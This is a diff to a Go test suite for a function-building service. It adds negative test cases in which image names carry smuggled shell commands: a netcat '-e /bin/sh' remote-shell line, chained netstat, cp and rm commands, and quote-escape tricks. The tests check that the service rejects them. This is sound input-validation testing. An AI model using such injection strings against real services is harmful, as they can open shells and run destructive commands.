@@ -459,7 +459,11 @@ func (suite *functionTestSuite) TestSanitizeFunctionInfo() {
 
 		// negative cases
 		"image/tag:v1.0.0 || nc 127.0.0.1 8000 -e /bin/sh ls": http.StatusBadRequest,
-		"123.123.123.123:123/tag:v1.0.0 || echo something ":   http.StatusBadRequest,
+		"123.123.123.123:123/tag:v1.0.0 | echo something":    http.StatusBadRequest,
+		"repo/image:v1.0.0;xyz&netstat":                       http.StatusBadRequest,
+		"repo/image:v1.0.0;ls|cp&rm":                          http.StatusBadRequest,
+		"image\" cp something":                                http.StatusBadRequest,
+		"image\\\" cp something":                              http.StatusBadRequest,
 	} {
 		requestBody := fmt.Sprintf(bodyPattern, buildImage)
 		suite.logger.InfoWith("Running function sanitization case",
@@ -468,7 +472,12 @@ func (suite *functionTestSuite) TestSanitizeFunctionInfo() {
 
 		var encodedExpectedResponse interface{}
 		if expectedStatusCode > 299 {
-			encodedExpectedResponse = restful.NewErrorContainsVerifier(suite.logger, []string{"Invalid"}).Verify
+
+			// some of these cases will cause the sanitation to fail, but some might fail it earlier on Unmarshal
+			// for making the body an invalid json, e.g.
+			//   Error - invalid character 'c' after object key:value pair
+			encodedExpectedResponse = restful.NewErrorContainsVerifier(suite.logger,
+				[]string{"Invalid", "invalid"}).Verify
 		} else {
 
 			verifyCreateFunction := func(createFunctionOptions *platform.CreateFunctionOptions) bool {
